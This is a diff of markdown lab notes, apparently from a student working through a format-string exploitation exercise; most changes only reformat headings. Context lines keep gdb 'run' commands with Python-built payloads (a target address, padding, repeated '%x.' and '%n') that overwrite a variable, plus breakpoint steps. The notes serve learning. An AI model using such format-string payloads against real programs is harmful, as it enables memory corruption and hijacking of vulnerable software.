@@ -118,8 +118,11 @@ Note: when I re-run this my command was this:
 run `(python -c 'print "\x28\xa0\x04\x08"+"BB" + "%x." * 143+"%n"')`
 ```
 
+
 Output:![Alt text](image-9.png)
-14. Extra: see the value of target changing
+
+
+## Extra: see the value of target changing
 - add break at line 5
 - add break at line 15
 - run your update command: mine was: run `(python -c 'print "\x28\xa0\x04\x08" +"BBB"+ "%x." * 146+"%n"')`
@@ -130,7 +133,7 @@ Output:![Alt text](image-9.png)
 ![Alt text](image-10.png)
 
 
-##Outstanding questions
+## Outstanding questions
 - I still don't get the addresses and why if I change AAAA to the exact address it works
 
 
